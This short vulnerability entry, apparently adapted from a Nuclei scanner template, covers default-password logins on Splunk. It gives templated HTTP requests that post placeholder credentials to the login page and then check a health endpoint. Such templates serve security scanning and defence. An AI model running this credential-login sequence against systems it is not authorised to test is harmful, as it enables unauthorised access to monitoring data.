# Vulnerability: Splunk - Default Password
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`splunk-default-login.yaml`)

## Description
Splunk Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1
Host: {{Hostname}}

POST /en-US/account/login HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate, br
Referer: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{BaseURL}}

{{cval}}&username={{username}}&password={{password}}&return_to=%2Fen-US%2F&set_has_logged_in=false

GET /en-US/splunkd/__raw/services/server/health/splunkd?output_mode=json&_= HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate, br
Referer: {{BaseURL}}
```

